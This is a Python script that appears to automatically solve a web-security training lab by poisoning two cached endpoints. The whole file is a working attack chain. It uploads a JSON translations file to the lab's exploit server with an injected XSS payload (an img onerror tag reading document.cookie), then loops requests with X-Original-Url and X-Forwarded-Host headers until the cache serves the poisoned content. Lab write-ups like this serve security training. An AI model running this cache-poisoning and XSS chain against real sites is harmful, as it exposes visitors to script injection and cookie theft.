import requests
import re
from urllib.parse import unquote_plus
import time
import sys


class LabSolver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.session = requests.Session()
        self.exploit_server_url = None

    def get_exploit_server_url(self):
        response = self.session.get(self.lab_url, proxies={'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}, verify=False)
        self.exploit_server_url = re.search(r'href=\'(https://exploit-.*?)\'', response.text).group(1)

    def store_payload_on_exploit_server(self):
        data = {
            'urlIsHttps': 'on',
            'responseFile': '/resources/json/translations.json',
            'responseHead': unquote_plus('HTTP%2F1.1+200+OK%0D%0AContent-Type%3A+application%2Fjson%3B+charset%3Dutf-8%0D%0AAccess-Control-Allow-Origin: *'),
            'responseBody': '''{
    "en": {
        "name": "English"
    },
    "es": {
        "name": "español",
        "translations": {
            "Return to list": "Volver a la lista",
            "View details": "</a><img src=1 onerror='alert(document.cookie)' />",
            "Description:": "Descripción"
        }
    }
}''',
            'formAction': 'STORE'
        }
        self.session.post(self.exploit_server_url, data=data, proxies={'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}, verify=False)

    def poison_two_endpoints(self):
        headers = {
            'X-Original-Url': '/setlang\es'
        }
        response = self.session.get(self.lab_url, headers=headers, allow_redirects=False, proxies={'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}, verify=False)
        while True:
            if 'initTranslations' in response.text:
                response = self.session.get(self.lab_url, headers=headers, allow_redirects=False, proxies={'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}, verify=False)
            else:
                break
        response = self.session.get(self.lab_url, headers=headers, allow_redirects=False,
                                    proxies={'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}, verify=False)
        headers = {
            'X-Forwarded-Host': self.exploit_server_url.replace('https://', '')
        }
        response = self.session.get(self.lab_url + '?localized=1', headers=headers, proxies={'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}, verify=False)
        while True:
            if '"{}","path":"/"'.format(self.exploit_server_url.replace('https://', '')) not in response.text:
                response = self.session.get(self.lab_url, headers=headers, proxies={'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}, verify=False)
            else:
                break
        response = self.session.get(self.lab_url + '?localized=1', headers=headers,
                                    proxies={'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}, verify=False)

    def check_solution(self):
        response = self.session.get(self.lab_url, proxies={'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}, verify=False)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def solve(self):
        self.get_exploit_server_url()
        self.store_payload_on_exploit_server()
        self.poison_two_endpoints()
        time.sleep(30)
        self.check_solution()


solver = LabSolver(sys.argv[1])
solver.solve()
